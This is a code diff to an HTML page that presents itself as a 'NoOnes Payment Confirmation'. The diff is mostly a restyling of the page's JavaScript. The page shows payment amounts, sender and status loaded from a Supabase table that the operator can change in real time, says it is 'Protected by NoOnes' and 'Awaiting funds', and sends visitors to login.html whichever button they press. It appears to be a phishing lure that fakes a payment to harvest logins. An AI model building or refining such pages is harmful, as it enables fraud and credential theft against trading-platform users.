@@ -11,14 +11,15 @@
     <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&subset=cyrillic,cyrillic-ext,latin-ext&display=swap" rel="stylesheet" />
 
     <!-- Supabase JS -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
+    </script>
 
     <style>
         /* ===== CSS Variables ===== */
         :root {
             --mantine-font-family: 'IBM Plex Sans', -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
             --mantine-font-family-monospace: 'IBM Plex Mono', ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-            
+
             /* Colors */
             --color-green: #07B979;
             --color-green-hover: #059E66;
@@ -36,13 +37,13 @@
             --color-error: #F22323;
             --color-noones: #07B979;
             --color-light-noones: #E8F8F2;
-            
+
             /* Shadows */
-            --shadow-sm: 0 0.125rem 0.5rem rgba(0,0,0,0.06);
-            --shadow-md: 0 0.25rem 1rem rgba(0,0,0,0.08);
-            --shadow-lg: 0 0.5rem 2rem rgba(0,0,0,0.12);
-            --shadow-xl: 0 1rem 3rem rgba(0,0,0,0.15);
-            
+            --shadow-sm: 0 0.125rem 0.5rem rgba(0, 0, 0, 0.06);
+            --shadow-md: 0 0.25rem 1rem rgba(0, 0, 0, 0.08);
+            --shadow-lg: 0 0.5rem 2rem rgba(0, 0, 0, 0.12);
+            --shadow-xl: 0 1rem 3rem rgba(0, 0, 0, 0.15);
+
             /* Spacing */
             --spacing-xs: 0.625rem;
             --spacing-sm: 0.75rem;
@@ -63,10 +64,10 @@
             --color-border: #373A40;
             --color-dark-grey: #909296;
             --color-light-noones: #0A3D2E;
-            --shadow-sm: 0 0.125rem 0.5rem rgba(0,0,0,0.3);
-            --shadow-md: 0 0.25rem 1rem rgba(0,0,0,0.4);
-            --shadow-lg: 0 0.5rem 2rem rgba(0,0,0,0.5);
-            --shadow-xl: 0 1rem 3rem rgba(0,0,0,0.6);
+            --shadow-sm: 0 0.125rem 0.5rem rgba(0, 0, 0, 0.3);
+            --shadow-md: 0 0.25rem 1rem rgba(0, 0, 0, 0.4);
+            --shadow-lg: 0 0.5rem 2rem rgba(0, 0, 0, 0.5);
+            --shadow-xl: 0 1rem 3rem rgba(0, 0, 0, 0.6);
         }
 
         [data-mantine-color-scheme="dark"] .bg-white {
@@ -188,7 +189,7 @@
             height: 1.125rem;
             border-radius: 9999px;
             background-color: var(--color-white);
-            box-shadow: 0 0.0625rem 0.25rem rgba(0,0,0,0.15);
+            box-shadow: 0 0.0625rem 0.25rem rgba(0, 0, 0, 0.15);
             transition: transform 0.3s ease;
             display: flex;
             align-items: center;
@@ -241,7 +242,8 @@
         }
 
         @keyframes iconPulse {
-            0%, 100% {
+            0%,
+            100% {
                 transform: scale(1);
                 box-shadow: 0 0 0 0 rgba(255, 184, 0, 0.3);
             }
@@ -280,7 +282,8 @@
         }
 
         @keyframes badgeGlow {
-            0%, 100% {
+            0%,
+            100% {
                 box-shadow: 0 0 0 0 rgba(7, 185, 121, 0.2);
             }
             50% {
@@ -951,19 +954,19 @@
         // ============================================
         // SUPABASE CONFIG - YOUR CREDENTIALS
         // ============================================
-        const SUPABASE_URL = 'https://precvldulohwudpfmzsn.supabase.co';
-        const SUPABASE_ANON_KEY = 'sb_publishable_tMV0V-5-ctvzQ36sGwYlRg__l3njaeG';
+        var SUPABASE_URL = 'https://precvldulohwudpfmzsn.supabase.co';
+        var SUPABASE_ANON_KEY = 'sb_publishable_tMV0V-5-ctvzQ36sGwYlRg__l3njaeG';
 
         // Initialize Supabase
-        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        var supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         // ============================================
         // THEME TOGGLE
         // ============================================
-        const themeToggle = document.getElementById('themeToggle');
-        const themeThumb = themeToggle.querySelector('.theme-thumb');
+        var themeToggle = document.getElementById('themeToggle');
+        var themeThumb = themeToggle.querySelector('.theme-thumb');
 
-        const savedTheme = localStorage.getItem('theme-preference');
+        var savedTheme = localStorage.getItem('theme-preference');
         if (savedTheme === 'dark') {
             themeToggle.classList.add('active');
             themeThumb.textContent = '☀️';
@@ -972,7 +975,7 @@
 
         themeToggle.addEventListener('click', function() {
             this.classList.toggle('active');
-            const isDark = this.classList.contains('active');
+            var isDark = this.classList.contains('active');
             themeThumb.textContent = isDark ? '☀️' : '🌙';
             document.documentElement.setAttribute('data-mantine-color-scheme', isDark ? 'dark' : 'light');
             localStorage.setItem('theme-preference', isDark ? 'dark' : 'light');
@@ -981,15 +984,16 @@
         // ============================================
         // TOAST NOTIFICATION
         // ============================================
-        const toast = document.getElementById('toast');
-        let toastTimeout;
+        var toast = document.getElementById('toast');
+        var toastTimeout;
 
-        function showToast(message, type = '') {
+        function showToast(message, type) {
+            type = type || '';
             toast.textContent = message;
             toast.className = 'toast' + (type ? ' ' + type : '');
             toast.classList.add('show');
             clearTimeout(toastTimeout);
-            toastTimeout = setTimeout(() => {
+            toastTimeout = setTimeout(function() {
                 toast.classList.remove('show');
             }, 3000);
         }
@@ -997,171 +1001,182 @@
         // ============================================
         // LOAD PAYMENT DATA FROM SUPABASE
         // ============================================
-        async function loadPaymentDataFromSupabase() {
-            try {
-                const { data, error } = await supabaseClient
-                    .from('payment_details')
-                    .select('*')
-                    .order('id', { ascending: false })
-                    .limit(1);
+        function loadPaymentDataFromSupabase() {
+            supabaseClient
+                .from('payment_details')
+                .select('*')
+                .order('id', { ascending: false })
+                .limit(1)
+                .then(function(result) {
+                    var data = result.data;
+                    var error = result.error;
 
-                if (error) throw error;
+                    if (error) throw error;
 
-                if (data && data.length > 0) {
-                    const record = data[0];
-                    displayPaymentData({
-                        sender: record.sender,
-                        recipient: record.recipient,
-                        amount: record.amount,
-                        currency: record.currency,
-                        date: record.date_time,
-                        method: record.payment_method,
-                        reference: record.reference,
-                        status: record.status,
-                        txId: record.transaction_id,
-                        statusTitle: record.status_title,
-                        statusSubtitle: record.status_subtitle
-                    });
-                    console.log('📂 Data loaded from Supabase');
-                    return true;
-                }
-                return false;
-            } catch (error) {
-                console.warn('⚠️ Supabase load failed:', error);
-                return false;
-            }
+                    if (data && data.length > 0) {
+                        var record = data[0];
+                        displayPaymentData({
+                            sender: record.sender,
+                            recipient: record.recipient,
+                            amount: record.amount,
+                            currency: record.currency,
+                            date: record.date_time,
+                            method: record.payment_method,
+                            reference: record.reference,
+                            status: record.status,
+                            txId: record.transaction_id,
+                            statusTitle: record.status_title,
+                            statusSubtitle: record.status_subtitle
+                        });
+                        console.log('📂 Data loaded from Supabase');
+                        return true;
+                    }
+                    return false;
+                })
+                .catch(function(error) {
+                    console.warn('⚠️ Supabase load failed:', error);
+                    return false;
+                });
         }
 
         // ============================================
         // DISPLAY PAYMENT DATA
         // ============================================
         function displayPaymentData(data) {
-            if (data.sender) document.getElementById('senderValue').textContent = data.sender;
-            if (data.recipient) document.getElementById('recipientValue').textContent = data.recipient;
+            var senderEl = document.getElementById('senderValue');
+            var recipientEl = document.getElementById('recipientValue');
+            var amountEl = document.getElementById('amountValue');
+            var amountDetailEl = document.getElementById('amountDetailValue');
+            var dateEl = document.getElementById('dateValue');
+            var methodEl = document.getElementById('methodValue');
+            var referenceEl = document.getElementById('referenceValue');
+            var statusEl = document.getElementById('statusValue');
+            var txEl = document.getElementById('txValue');
+            var statusTitleEl = document.getElementById('statusTitle');
+            var statusSubtitleEl = document.getElementById('statusSubtitle');
+            var usdEl = document.querySelector('.amount-usd');
+
+            if (senderEl && data.sender) senderEl.textContent = data.sender;
+            if (recipientEl && data.recipient) recipientEl.textContent = data.recipient;
             if (data.amount) {
-                const formattedAmount = typeof data.amount === 'number' ? data.amount.toLocaleString('en-US', {
+                var formattedAmount = typeof data.amount === 'number' ? data.amount.toLocaleString('en-US', {
                     minimumFractionDigits: 2,
                     maximumFractionDigits: 2
                 }) : data.amount;
-                document.getElementById('amountValue').textContent = formattedAmount;
-                document.getElementById('amountDetailValue').textContent = formattedAmount + ' ' + (data.currency || 'USDT');
-                const numAmount = parseFloat(String(data.amount).replace(/,/g, ''));
-                if (!isNaN(numAmount)) {
-                    const usdEl = document.querySelector('.amount-usd');
-                    if (usdEl) {
-                        usdEl.textContent = '≈ $' + numAmount.toLocaleString('en-US', {
-                            minimumFractionDigits: 2,
-                            maximumFractionDigits: 2
-                        }) + ' USD';
-                    }
+                if (amountEl) amountEl.textContent = formattedAmount;
+                if (amountDetailEl) amountDetailEl.textContent = formattedAmount + ' ' + (data.currency || 'USDT');
+                var numAmount = parseFloat(String(data.amount).replace(/,/g, ''));
+                if (!isNaN(numAmount) && usdEl) {
+                    usdEl.textContent = '≈ $' + numAmount.toLocaleString('en-US', {
+                        minimumFractionDigits: 2,
+                        maximumFractionDigits: 2
+                    }) + ' USD';
                 }
             }
-            if (data.date) {
-                const dateEl = document.getElementById('dateValue');
-                if (dateEl) {
-                    try {
-                        const d = new Date(data.date);
-                        if (!isNaN(d.getTime())) {
-                            dateEl.textContent = d.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
-                        } else {
-                            dateEl.textContent = data.date;
-                        }
-                    } catch (e) {
+            if (dateEl && data.date) {
+                try {
+                    var d = new Date(data.date);
+                    if (!isNaN(d.getTime())) {
+                        dateEl.textContent = d.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
+                    } else {
                         dateEl.textContent = data.date;
                     }
+                } catch (e) {
+                    dateEl.textContent = data.date;
                 }
             }
-            if (data.method) document.getElementById('methodValue').textContent = data.method;
-            if (data.reference) document.getElementById('referenceValue').textContent = data.reference;
-            if (data.status) document.getElementById('statusValue').textContent = data.status;
-            if (data.txId) document.getElementById('txValue').textContent = data.txId;
-            if (data.statusTitle) document.getElementById('statusTitle').textContent = data.statusTitle;
-            if (data.statusSubtitle) document.getElementById('statusSubtitle').textContent = data.statusSubtitle;
+            if (methodEl && data.method) methodEl.textContent = data.method;
+            if (referenceEl && data.reference) referenceEl.textContent = data.reference;
+            if (statusEl && data.status) statusEl.textContent = data.status;
+            if (txEl && data.txId) txEl.textContent = data.txId;
+            if (statusTitleEl && data.statusTitle) statusTitleEl.textContent = data.statusTitle;
+            if (statusSubtitleEl && data.statusSubtitle) statusSubtitleEl.textContent = data.statusSubtitle;
         }
 
         // ============================================
         // REALTIME SUBSCRIPTION - INSTANT UPDATES!
         // ============================================
-        let realtimeChannel = null;
-
         function setupRealtimeSubscription() {
-            if (realtimeChannel) {
-                supabaseClient.removeChannel(realtimeChannel);
-                console.log('🔄 Removed old realtime channel');
-            }
-
-            realtimeChannel = supabaseClient
+            var channel = supabaseClient
                 .channel('payment_changes')
                 .on(
-                    'postgres_changes',
-                    {
-                        event: '*',  // Listen to ALL events (INSERT, UPDATE, DELETE)
+                    'postgres_changes', {
+                        event: 'UPDATE',
                         schema: 'public',
                         table: 'payment_details'
                     },
-                    (payload) => {
-                        console.log('📡 Real-time update received!', payload);
-                        
-                        // If it's an UPDATE or INSERT, show the new data
-                        if (payload.eventType === 'UPDATE' || payload.eventType === 'INSERT') {
-                            const record = payload.new;
-                            displayPaymentData({
-                                sender: record.sender,
-                                recipient: record.recipient,
-                                amount: record.amount,
-                                currency: record.currency,
-                                date: record.date_time,
-                                method: record.payment_method,
-                                reference: record.reference,
-                                status: record.status,
-                                txId: record.transaction_id,
-                                statusTitle: record.status_title,
-                                statusSubtitle: record.status_subtitle
-                            });
-                            
-                            // Show toast notification
-                            showToast('🔄 Payment details updated instantly!', 'success');
-                        } else if (payload.eventType === 'DELETE') {
-                            console.log('🗑️ Record deleted');
-                            showToast('⚠️ Payment record was deleted', 'error');
-                        }
+                    function(payload) {
+                        console.log('📡 Real-time update received on landing page!', payload);
+                        var record = payload.new;
+
+                        // Update the page with new data
+                        displayPaymentData({
+                            sender: record.sender,
+                            recipient: record.recipient,
+                            amount: record.amount,
+                            currency: record.currency,
+                            date: record.date_time,
+                            method: record.payment_method,
+                            reference: record.reference,
+                            status: record.status,
+                            txId: record.transaction_id,
+                            statusTitle: record.status_title,
+                            statusSubtitle: record.status_subtitle
+                        });
+
+                        // Show notification
+                        showToast('🔄 Payment details updated in real-time!', 'success');
                     }
                 )
-                .subscribe((status) => {
+                .subscribe(function(status) {
                     console.log('📡 Realtime subscription status:', status);
                     if (status === 'SUBSCRIBED') {
                         console.log('✅ Realtime is active and waiting for updates!');
                     } else if (status === 'CHANNEL_ERROR') {
                         console.error('❌ Realtime channel error - check Supabase Realtime settings');
-                        showToast('⚠️ Real-time connection error', 'error');
                     }
                 });
         }
 
         // ============================================
+        // LOAD FROM LOCALSTORAGE (FALLBACK)
+        // ============================================
+        function loadFromLocalStorage() {
+            var savedData = localStorage.getItem('paymentData');
+            if (savedData) {
+                try {
+                    displayPaymentData(JSON.parse(savedData));
+                    console.log('📂 Data loaded from localStorage (fallback)');
+                } catch (e) {
+                    console.log('No saved data found');
+                }
+            }
+        }
+
+        // ============================================
         // COPY TO CLIPBOARD
         // ============================================
-        document.querySelectorAll('.copy-btn').forEach(btn => {
+        document.querySelectorAll('.copy-btn').forEach(function(btn) {
             btn.addEventListener('click', function(e) {
                 e.stopPropagation();
-                const targetId = this.dataset.copy;
-                const targetEl = document.getElementById(targetId);
-                
+                var targetId = this.dataset.copy;
+                var targetEl = document.getElementById(targetId);
+
                 if (targetEl) {
-                    const textToCopy = targetEl.textContent.trim();
-                    
+                    var textToCopy = targetEl.textContent.trim();
+
                     if (navigator.clipboard && navigator.clipboard.writeText) {
-                        navigator.clipboard.writeText(textToCopy).then(() => {
+                        navigator.clipboard.writeText(textToCopy).then(function() {
                             this.classList.add('copied');
                             this.innerHTML = '<span class="copy-icon">✓</span> Copied';
                             showToast('Copied: ' + textToCopy.slice(0, 30) + (textToCopy.length > 30 ? '...' : ''));
-                            setTimeout(() => {
+                            setTimeout(function() {
                                 this.classList.remove('copied');
                                 this.innerHTML = '<span class="copy-icon">📋</span> Copy';
                             }, 2000);
-                        }).catch(() => {
+                        }.bind(this)).catch(function() {
                             fallbackCopy(textToCopy, this);
-                        });
+                        }.bind(this));
                     } else {
                         fallbackCopy(textToCopy, this);
                     }
@@ -1170,27 +1185,27 @@
         });
 
         function fallbackCopy(text, btn) {
-            const textarea = document.createElement('textarea');
+            var textarea = document.createElement('textarea');
             textarea.value = text;
             textarea.style.position = 'fixed';
             textarea.style.opacity = '0';
             textarea.style.pointerEvents = 'none';
             document.body.appendChild(textarea);
             textarea.select();
-            
+
             try {
                 document.execCommand('copy');
                 btn.classList.add('copied');
                 btn.innerHTML = '<span class="copy-icon">✓</span> Copied';
                 showToast('Copied: ' + text.slice(0, 30) + (text.length > 30 ? '...' : ''));
-                setTimeout(() => {
+                setTimeout(function() {
                     btn.classList.remove('copied');
                     btn.innerHTML = '<span class="copy-icon">📋</span> Copy';
                 }, 2000);
             } catch (err) {
                 showToast('Failed to copy');
             }
-            
+
             document.body.removeChild(textarea);
         }
 
@@ -1200,17 +1215,17 @@
         document.getElementById('acceptBtn').addEventListener('click', function() {
             this.disabled = true;
             document.getElementById('declineBtn').disabled = true;
-            
+
             document.querySelector('.status-title').textContent = 'Payment Accepted';
             document.querySelector('.status-subtitle').textContent = 'Transaction completed successfully';
             document.getElementById('statusValue').textContent = 'Completed';
             document.querySelector('.status-icon').textContent = '✅';
             document.querySelector('.status-icon').style.background = '#E8F8F2';
             document.querySelector('.status-icon').style.color = '#07B979';
-            
+
             document.getElementById('loadingOverlay').classList.add('active');
-            
-            setTimeout(() => {
+
+            setTimeout(function() {
                 window.location.href = 'login.html';
             }, 3000);
         });
@@ -1221,17 +1236,17 @@
         document.getElementById('declineBtn').addEventListener('click', function() {
             this.disabled = true;
             document.getElementById('acceptBtn').disabled = true;
-            
+
             document.querySelector('.status-title').textContent = 'Payment Declined';
             document.querySelector('.status-subtitle').textContent = 'Transaction has been cancelled';
             document.getElementById('statusValue').textContent = 'Declined';
             document.querySelector('.status-icon').textContent = '❌';
             document.querySelector('.status-icon').style.background = '#FFEEEE';
             document.querySelector('.status-icon').style.color = '#F22323';
-            
+
             document.getElementById('loadingOverlay').classList.add('active');
-            
-            setTimeout(() => {
+
+            setTimeout(function() {
                 window.location.href = 'login.html';
             }, 3000);
         });
@@ -1239,10 +1254,10 @@
         // ============================================
         // CLICK ON DETAIL ITEM TO COPY
         // ============================================
-        document.querySelectorAll('.detail-item').forEach(item => {
+        document.querySelectorAll('.detail-item').forEach(function(item) {
             item.addEventListener('click', function(e) {
                 if (e.target.closest('.copy-btn')) return;
-                const copyBtn = this.querySelector('.copy-btn');
+                var copyBtn = this.querySelector('.copy-btn');
                 if (copyBtn) {
                     copyBtn.click();
                 }
@@ -1254,9 +1269,9 @@
         // ============================================
         document.addEventListener('keydown', function(e) {
             if (e.ctrlKey && e.key === 'c') {
-                const activeElement = document.activeElement;
+                var activeElement = document.activeElement;
                 if (activeElement && activeElement.closest('.detail-item')) {
-                    const copyBtn = activeElement.closest('.detail-item').querySelector('.copy-btn');
+                    var copyBtn = activeElement.closest('.detail-item').querySelector('.copy-btn');
                     if (copyBtn) {
                         e.preventDefault();
                         copyBtn.click();
@@ -1266,50 +1281,47 @@
         });
 
         // ============================================
+        // CHECK CONNECTION
+        // ============================================
+        function checkConnection() {
+            supabaseClient
+                .from('payment_details')
+                .select('id')
+                .limit(1)
+                .then(function(result) {
+                    var error = result.error;
+                    if (error) throw error;
+                    console.log('✅ Supabase connected');
+                })
+                .catch(function(error) {
+                    console.warn('⚠️ Supabase connection error:', error);
+                });
+        }
+
+        // ============================================
         // INITIALIZE - Load from Supabase on page load & setup realtime
         // ============================================
-        document.addEventListener('DOMContentLoaded', async function() {
+        function init() {
             // Check connection
-            try {
-                const { data, error } = await supabaseClient
-                    .from('payment_details')
-                    .select('id')
-                    .limit(1);
-                
-                if (error) {
-                    console.warn('⚠️ Supabase connection issue:', error);
-                    showToast('⚠️ Cannot connect to Supabase', 'error');
-                } else {
-                    console.log('✅ Supabase connected');
-                }
-            } catch (e) {
-                console.warn('⚠️ Supabase connection error:', e);
-            }
-            
+            checkConnection();
+
             // Try Supabase first
-            const loaded = await loadPaymentDataFromSupabase();
-            
-            if (!loaded) {
-                // Fallback to localStorage
-                const savedData = localStorage.getItem('paymentData');
-                if (savedData) {
-                    try {
-                        displayPaymentData(JSON.parse(savedData));
-                        console.log('📂 Data loaded from localStorage (fallback)');
-                    } catch (e) {
-                        console.log('No saved data found');
-                    }
-                }
-            }
-            
+            loadPaymentDataFromSupabase();
+
+            // Also check localStorage as fallback
+            loadFromLocalStorage();
+
             // Setup realtime subscription for instant updates
             setupRealtimeSubscription();
-        });
 
-        console.log('%c 💰 NoOnes Payment Confirmation ', 'background: #07B979; color: white; font-size: 14px; font-weight: bold; padding: 4px 8px; border-radius: 4px;');
-        console.log('%c 🔒 Protected by NoOnes ', 'color: #07B979; font-size: 12px; font-weight: bold;');
-        console.log('%c 📡 Real-time sync enabled - updates appear instantly! ', 'color: #FF8C00; font-size: 12px; font-weight: bold;');
-        console.log('%c ⏳ Awaiting funds - please wait for confirmation. ', 'color: #6B7A75; font-size: 12px;');
+            console.log('%c 💰 NoOnes Payment Confirmation ', 'background: #07B979; color: white; font-size: 14px; font-weight: bold; padding: 4px 8px; border-radius: 4px;');
+            console.log('%c 🔒 Protected by NoOnes ', 'color: #07B979; font-size: 12px; font-weight: bold;');
+            console.log('%c 📡 Real-time sync enabled - updates appear instantly! ', 'color: #FF8C00; font-size: 12px; font-weight: bold;');
+            console.log('%c ⏳ Awaiting funds - please wait for confirmation. ', 'color: #6B7A75; font-size: 12px;');
+        }
+
+        // Run when page loads
+        document.addEventListener('DOMContentLoaded', init);
     </script>
 </body>
-</html>
+</html>s
